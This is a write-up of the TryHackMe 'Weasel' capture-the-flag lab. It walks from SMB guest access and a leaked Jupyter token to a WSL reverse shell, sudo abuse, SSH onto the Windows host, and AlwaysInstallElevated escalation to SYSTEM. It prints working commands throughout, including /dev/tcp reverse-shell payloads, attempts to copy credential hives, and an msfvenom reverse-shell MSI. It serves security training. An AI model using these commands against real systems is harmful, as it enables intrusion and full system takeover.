---
title: "Weasel"
date: 2024-12-23T12:13:37-05:00
draft: false
tags:
- Windows
- WSL Escape
- Linux
- AlwaysInstallElevated
- Autologon
- Null Session
- THM
---

![Weasel](/img/weasel/weasel.png)


### Description
Weasel is a Medium difficulty challenge on Tryhackme. We get a foothold on WSL through Jupyter Notebook and find a SSH key that allows us to SSH into the Windows host. Finally, we escalate privileges by exploiting AlwaysInstallElevated with a malicious Windows Installer file.


### Recon
First thing's first. Let's start with a nmap scan.

```
# Nmap 7.94SVN scan initiated Sun Dec 22 23:42:51 2024 as: nmap -p- -A -v -oN /tmp/nmap.scan -T4 10.10.34.193
Increasing send delay for 10.10.34.193 from 0 to 5 due to 547 out of 1366 dropped probes since last increase.
Increasing send delay for 10.10.34.193 from 5 to 10 due to 11 out of 21 dropped probes since last increase.
Nmap scan report for 10.10.34.193
Host is up (0.26s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 2b:17:d8:8a:1e:8c:99:bc:5b:f5:3d:0a:5e:ff:5e:5e (RSA)
|   256 3c:c0:fd:b5:c1:57:ab:75:ac:81:10:ae:e2:98:12:0d (ECDSA)
|_  256 e9:f0:30:be:e6:cf:ef:fe:2d:14:21:a0:ac:45:7b:70 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: DEV-DATASCI-JUP
|   NetBIOS_Domain_Name: DEV-DATASCI-JUP
|   NetBIOS_Computer_Name: DEV-DATASCI-JUP
|   DNS_Domain_Name: DEV-DATASCI-JUP
|   DNS_Computer_Name: DEV-DATASCI-JUP
|   Product_Version: 10.0.17763
|_  System_Time: 2024-12-23T06:11:34+00:00
|_ssl-date: 2024-12-23T06:11:48+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DEV-DATASCI-JUP
| Issuer: commonName=DEV-DATASCI-JUP
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-12-22T03:04:54
| Not valid after:  2025-06-23T03:04:54
| MD5:   cc8d:e018:37dd:d6b2:b0b9:556e:9c44:156b
|_SHA-1: 159e:345a:b60d:485b:e255:25fd:6bd2:7cc0:1eaa:67eb
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8888/tcp  open  http          Tornado httpd 6.0.3
| http-title: Jupyter Notebook
|_Requested resource was /login?next=%2Ftree%3F
| http-methods: 
|_  Supported Methods: GET POST
| http-robots.txt: 1 disallowed entry 
|_/ 
|_http-favicon: Unknown favicon MD5: 97C6417ED01BDC0AE3EF32AE4894FD03
|_http-server-header: TornadoServer/6.0.3
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
Aggressive OS guesses: Microsoft Windows Server 2019 (95%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (91%), Microsoft Windows Server 2012 (91%), Microsoft Windows 10 1709 - 1909 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%), Microsoft Windows 10 1703 (90%), Microsoft Windows 8 (90%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 Update 1 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: Randomized
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-12-23T06:11:35
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   137.61 ms 10.13.0.1
2   ... 3
4   263.53 ms 10.10.34.193

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Dec 23 00:11:48 2024 -- 1 IP address (1 host up) scanned in 1737.39 seconds
```

We some interesting ports open. Looking at port 8888, there is a notebook server.

![Jupyter interface](/img/weasel/jupyter.png)

Unfortunately, we don't have a token or password. Next, I took a look at the SMB shares on port 445 and noticed that guest access was allowed.

```
┌──(kali㉿kali)-[~]
└─$ nxc smb 10.10.34.193 -u guest -p '' --shares
SMB         10.10.34.193    445    DEV-DATASCI-JUP  [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV-DATASCI-JUP) (domain:DEV-DATASCI-JUP) (signing:False) (SMBv1:False)
SMB         10.10.34.193    445    DEV-DATASCI-JUP  [+] DEV-DATASCI-JUP\guest: 
SMB         10.10.34.193    445    DEV-DATASCI-JUP  [*] Enumerated shares
SMB         10.10.34.193    445    DEV-DATASCI-JUP  Share           Permissions     Remark
SMB         10.10.34.193    445    DEV-DATASCI-JUP  -----           -----------     ------
SMB         10.10.34.193    445    DEV-DATASCI-JUP  ADMIN$                          Remote Admin
SMB         10.10.34.193    445    DEV-DATASCI-JUP  C$                              Default share
SMB         10.10.34.193    445    DEV-DATASCI-JUP  datasci-team    READ,WRITE      
SMB         10.10.34.193    445    DEV-DATASCI-JUP  IPC$            READ            Remote IPC
```

We have read and write permissions on the nonstandard ```datasci-team```  share. Taking

```
┌──(kali㉿kali)-[/tmp]
└─$ smbclient //10.10.34.193/datasci-team -U guest --password=''
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Dec 22 21:13:41 2024
  ..                                  D        0  Sun Dec 22 21:13:41 2024
  .ipynb_checkpoints                 DA        0  Thu Aug 25 10:26:47 2022
  Long-Tailed_Weasel_Range_-_CWHR_M157_[ds1940].csv      A      146  Thu Aug 25 10:26:46 2022
  misc                               DA        0  Thu Aug 25 10:26:47 2022
  MPE63-3_745-757.pdf                 A   414804  Thu Aug 25 10:26:46 2022
  papers                             DA        0  Thu Aug 25 10:26:47 2022
  pics                               DA        0  Thu Aug 25 10:26:47 2022
  requirements.txt                    A       12  Thu Aug 25 10:26:46 2022
  weasel.ipynb                        A     4308  Thu Aug 25 10:26:46 2022
  weasel.txt                          A       51  Thu Aug 25 10:26:46 2022

                15587583 blocks of size 4096. 8928179 blocks available
smb: \> 
```

I transferred everything to my local machine for easier enumeration.

```
smb: \> lcd /tmp/smb
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
getting file \Long-Tailed_Weasel_Range_-_CWHR_M157_[ds1940].csv of size 146 as Long-Tailed_Weasel_Range_-_CWHR_M157_[ds1940].csv (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \MPE63-3_745-757.pdf of size 414804 as MPE63-3_745-757.pdf (109.2 KiloBytes/sec) (average 68.5 KiloBytes/sec)
getting file \requirements.txt of size 12 as requirements.txt (0.0 KiloBytes/sec) (average 58.5 KiloBytes/sec)
getting file \weasel.ipynb of size 4308 as weasel.ipynb (4.7 KiloBytes/sec) (average 52.4 KiloBytes/sec)
getting file \weasel.txt of size 51 as weasel.txt (0.1 KiloBytes/sec) (average 47.1 KiloBytes/sec)
getting file \.ipynb_checkpoints\requirements-checkpoint.txt of size 12 as .ipynb_checkpoints/requirements-checkpoint.txt (0.0 KiloBytes/sec) (average 42.6 KiloBytes/sec)
getting file \.ipynb_checkpoints\weasel-checkpoint.ipynb of size 5972 as .ipynb_checkpoints/weasel-checkpoint.ipynb (6.3 KiloBytes/sec) (average 39.4 KiloBytes/sec)
getting file \misc\jupyter-token.txt of size 52 as misc/jupyter-token.txt (0.1 KiloBytes/sec) (average 36.3 KiloBytes/sec)
getting file \papers\BI002_2613_Cz-40-2_Acta-T34-nr25-347-359_o.pdf of size 3491735 as papers/BI002_2613_Cz-40-2_Acta-T34-nr25-347-359_o.pdf (177.8 KiloBytes/sec) (average 124.9 KiloBytes/sec)
getting file \papers\Dillard_Living_Like_Weasels.pdf of size 45473 as papers/Dillard_Living_Like_Weasels.pdf (34.7 KiloBytes/sec) (average 121.3 KiloBytes/sec)
getting file \pics\57475-weasel-facts.html of size 301025 as pics/57475-weasel-facts.html (110.1 KiloBytes/sec) (average 120.4 KiloBytes/sec)
getting file \pics\long-tailed-weasel of size 250269 as pics/long-tailed-weasel (72.2 KiloBytes/sec) (average 116.1 KiloBytes/sec)
getting file \pics\Weasel of size 229746 as pics/Weasel (81.6 KiloBytes/sec) (average 113.8 KiloBytes/sec)
```

A lot of stuff about weasels, but also the file ```jupyter-token.txt``` in ```misc```.

```
┌──(kali㉿kali)-[/tmp/smb]
└─$ ls -al misc 
total 4
drwxrwxr-x 2 kali kali  60 Dec 22 21:15 .
drwxrwxr-x 6 kali kali 220 Dec 22 21:15 ..
-rw-r--r-- 1 kali kali  52 Dec 22 21:15 jupyter-token.txt
                                                                                                                                            
┌──(kali㉿kali)-[/tmp/smb]
└─$ cat misc/jupyter-token.txt
067470c5ddsadc54153ghfjd817d15b5d5f5341e56b0dsad78a
```

### Foothold
We are able to use this token to login to Jupyter Notebook on port 8888, where we can edit ```weasel.ipynb``` or create a new Jupyter notebook file to get a shell.

![Jupyter authenticated](/img/weasel/logon.png)

I tried to use Python to execute PowerShell and get a reverse shell that way. I wasn't able to get a connection, and after some testing realized that Windows-specific features like PowerShell simply weren't being executed correctly. On the other hand, Linux commands were working perfectly fine. Given that our nmap scan revealed many details that our target is a Windows machine (e.g. RDP and Microsoft RPC). It's fairly safe to say that we are up against WSL.

![PowerShell vs Bash](/img/weasel/compare.png)

So I got a shell using bash.

![Python os shell](/img/weasel/ipy_shell.png)

```
┌──(kali㉿kali)-[/tmp/smb]
└─$ nc -nvlp 21
listening on [any] 21 ...
connect to [10.13.48.55] from (UNKNOWN) [10.10.34.193] 50376
bash: cannot set terminal process group (10): Invalid argument
bash: no job control in this shell
(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ 
```

### Breaking out of WSL
Checking sudo permissions is something I always do early one since it's usually an easy win, so I quickly found that ```/home/dev-datasci/.local/bin/jupyter``` can be executed with root privileges without a password.

```
(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ sudo -l
sudo -l
Matching Defaults entries for dev-datasci on DEV-DATASCI-JUP:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dev-datasci may run the following commands on DEV-DATASCI-JUP:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /home/dev-datasci/.local/bin/jupyter, /bin/su dev-datasci
        -c *
```

We have write permissions to ```/home/dev-datasci/.local/bin/```, and since there isn't a ```jupyter``` file there, we can create our own.

```
(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ pwd
pwd
/home/dev-datasci/datasci-team
(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ ls -al ../.local/bin
ls -al ../.local/bin
total 0
drwxrwxrwx 1 dev-datasci dev-datasci 4096 Aug 25  2022 .
drwx------ 1 dev-datasci dev-datasci 4096 Aug 25  2022 ..
-rwxrwxrwx 1 dev-datasci dev-datasci  216 Aug 25  2022 f2py
-rwxrwxrwx 1 dev-datasci dev-datasci  216 Aug 25  2022 f2py3
-rwxrwxrwx 1 dev-datasci dev-datasci  216 Aug 25  2022 f2py3.8
(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.13.48.55/80 0>&1'" > ../.local/bin/jupyter
echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.13.48.55/80 0>&1'" > ../.local/bin/jupyter
(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ chmod +x ../.local/bin/jupyter
chmod +x ../.local/bin/jupyter
```

Now to leverage our sudo privileges and execute it as root...

```
(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ sudo /home/dev-datasci/.local/bin/jupyter
sudo /home/dev-datasci/.local/bin/jupyter
```

```
┌──(kali㉿kali)-[/tmp/smb]
└─$ nc -nvlp 80
listening on [any] 80 ...
connect to [10.13.48.55] from (UNKNOWN) [10.10.34.193] 50863
bash: cannot set terminal process group (10): Invalid argument
bash: no job control in this shell
root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# 
```

With root privileges, we now have a better chance of escaping the WSL environment and onto the host OS. I tried to navigate to the host filesystem under ```/mnt```. It contains a mount to the C drive, but it's empty...

```
root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# ls -al /mnt
ls -al /mnt
total 0
drwxr-xr-x 1 root root 4096 Aug 25  2022 .
drwxr-xr-x 1 root root 4096 Aug 25  2022 ..
drwxrwxrwx 1 root root 4096 Aug 25  2022 c
root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# ls -al /mnt/c
ls -al /mnt/c
total 0
drwxrwxrwx 1 root root 4096 Aug 25  2022 .
drwxr-xr-x 1 root root 4096 Aug 25  2022 ..
```

Since we are root, we can remount the filesystem.

```
root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# sudo mount -t drvfs C: /mnt/c
sudo mount -t drvfs C: /mnt/c
root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# ls -al /mnt/c
ls -al /mnt/c
ls: cannot read symbolic link '/mnt/c/Documents and Settings': Permission denied
ls: cannot access '/mnt/c/pagefile.sys': Permission denied
ls: '/mnt/c/System Volume Information': Permission denied
total 0
drwxrwxrwx 1 root root 4096 Aug 25  2022 $Recycle.Bin
drwxrwxrwx 1 root root 4096 Mar 14  2023 .
drwxr-xr-x 1 root root 4096 Aug 25  2022 ..
lrwxrwxrwx 1 root root   12 Aug 25  2022 Documents and Settings
drwxrwxrwx 1 root root 4096 Aug 25  2022 PerfLogs
drwxrwxrwx 1 root root 4096 Aug 25  2022 Program Files
drwxrwxrwx 1 root root 4096 Aug 25  2022 Program Files (x86)
drwxrwxrwx 1 root root 4096 Mar 13  2023 ProgramData
drwxrwxrwx 1 root root 4096 Aug 25  2022 Recovery
d--x--x--x 1 root root 4096 Aug 25  2022 System Volume Information
drwxrwxrwx 1 root root 4096 Aug 25  2022 Users
drwxrwxrwx 1 root root 4096 Mar 13  2023 Windows
drwxrwxrwx 1 root root 4096 Dec 22 19:56 datasci-team
-????????? ? ?    ?       ?            ? pagefile.sys
```

I tried to find ways to pivot to the host environment like copying the ```HKLM\SAM``` and ```HKLM\SYSTEM``` registries to dump local SAM hashes and searching for credentials in files. Unfortunately, all of these lead nowhere.[^1]

[^1]: You can read still the flags here, but AFAIK getting command execution on Windows isn't possible from the mounted filesystem.

```
root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# cp /mnt/c/Windows/System32/config/SAM /tmp/sam
cp /mnt/c/Windows/System32/config/SAM /tmp/sam
cp: cannot open '/mnt/c/Windows/System32/config/SAM' for reading: Permission denied
root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# cp /mnt/c/Windows/System32/config/SYSTEM /tmp/system
cp /mnt/c/Windows/System32/config/SYSTEM /tmp/system
cp: cannot open '/mnt/c/Windows/System32/config/SYSTEM' for reading: Permission denied
```

I eventually fell back to WSL to look for other clues. We see a ssh private key in the ```dev-datasci``` user's home directory.

```
root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team$ ls ..
ls ..
anaconda3
anacondainstall.sh
datasci-team
dev-datasci-lowpriv_id_ed25519
```

RID cycling confirms ```dev-datasci-lowpriv``` is a valid user on the Windows machine.

```
┌──(kali㉿kali)-[/tmp]
└─$ nxc smb 10.10.34.193 -u guest -p '' --rid-brute
SMB         10.10.34.193    445    DEV-DATASCI-JUP  [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV-DATASCI-JUP) (domain:DEV-DATASCI-JUP) (signing:False) (SMBv1:False)
SMB         10.10.34.193    445    DEV-DATASCI-JUP  [+] DEV-DATASCI-JUP\guest: 
SMB         10.10.34.193    445    DEV-DATASCI-JUP  500: DEV-DATASCI-JUP\Administrator (SidTypeUser)
SMB         10.10.34.193    445    DEV-DATASCI-JUP  501: DEV-DATASCI-JUP\Guest (SidTypeUser)
SMB         10.10.34.193    445    DEV-DATASCI-JUP  503: DEV-DATASCI-JUP\DefaultAccount (SidTypeUser)
SMB         10.10.34.193    445    DEV-DATASCI-JUP  504: DEV-DATASCI-JUP\WDAGUtilityAccount (SidTypeUser)
SMB         10.10.34.193    445    DEV-DATASCI-JUP  513: DEV-DATASCI-JUP\None (SidTypeGroup)
SMB         10.10.34.193    445    DEV-DATASCI-JUP  1000: DEV-DATASCI-JUP\dev-datasci-lowpriv (SidTypeUser)
SMB         10.10.34.193    445    DEV-DATASCI-JUP  1001: DEV-DATASCI-JUP\sshd (SidTypeUser)
```

We can therefore ssh onto the Windows host OS.

```
┌──(kali㉿kali)-[/tmp]
└─$ ssh -i dev-datasci-lowpriv_id_ed25519 dev-datasci-lowpriv@10.10.34.193
```

### Privilege Escalation
We can use WinPEAS to facilitate our enumeration. I transferred it to the Windows host through scp.

```
┌──(kali㉿kali)-[~]
└─$ scp -i /tmp/id_rsa ~/winPEASany.exe dev-datasci-lowpriv@10.10.34.193:C:\Users\datasci-team\winpeas.exe    
winPEASany.exe
```

The filename did get jumbled up, so I renamed it for clarity.

```
dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv>dir 
 Volume in drive C has no label. 
 Volume Serial Number is 8AA3-53D1

 Directory of C:\Users\dev-datasci-lowpriv

12/22/2024  08:30 PM    <DIR>          .
12/22/2024  08:30 PM    <DIR>          ..
08/25/2022  05:20 AM    <DIR>          .ssh
08/25/2022  04:22 AM    <DIR>          3D Objects
08/25/2022  04:22 AM    <DIR>          Contacts
08/25/2022  06:39 AM    <DIR>          Desktop
08/25/2022  04:22 AM    <DIR>          Documents
08/25/2022  04:22 AM    <DIR>          Downloads
08/25/2022  04:22 AM    <DIR>          Favorites
08/25/2022  04:22 AM    <DIR>          Links
08/25/2022  04:22 AM    <DIR>          Music
08/25/2022  04:22 AM    <DIR>          Pictures
08/25/2022  04:22 AM    <DIR>          Saved Games
08/25/2022  04:22 AM    <DIR>          Searches
12/22/2024  08:31 PM         9,841,664 Usersdatasci-teamwinpeas.exe
08/25/2022  04:22 AM    <DIR>          Videos
               1 File(s)      9,841,664 bytes
              15 Dir(s)  36,645,306,368 bytes free

dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv>ren Usersdatasci-teamwinpeas.exe winpeas.exe
```

Running WinPEAS reveals a couple things of interest. First, ```dev-datasci-lowpriv``` has permissions to run Windows Installer packages with elevated privileges.

![Winpeas AlwaysInstallElevated](/img/weasel/install_elevated.png)

```dev-datasci-lowpriv``` also has its credentials stored for AutoLogon.

![AutoLogon credentials](/img/weasel/autologin.png)

Now all we need to do is create a malicious .msi file and install it on the Windows host for privilege escalation. I generated one using msfvenom.

```
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.13.48.55 LPORT=8000 -f msi -o shell.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of msi file: 159744 bytes
Saved as: shell.msi
```

After transferring it onto our target, we can execute it. I had to explicitly run msiexec as ```dev-datasci-lowpriv``` with "runas".

```
dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv>runas /user:dev-datasci-lowpriv "msiexec /quiet /i C:\Users\dev-datasci-low
priv\shell.msi"
Enter the password for dev-datasci-lowpriv:
Attempting to start msiexec /quiet /i C:\Users\dev-datasci-lowpriv\shell.msi as user "DEV-DATASCI-JUP\dev-datasci-lowpriv" ...
```

And now we have a shell as ```nt authority\system```.

```
┌──(kali㉿kali)-[/tmp]
└─$ rlwrap nc -nvlp 8000
listening on [any] 8000 ...
connect to [10.13.48.55] from (UNKNOWN) [10.10.34.193] 53713
Microsoft Windows [Version 10.0.17763.3287]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```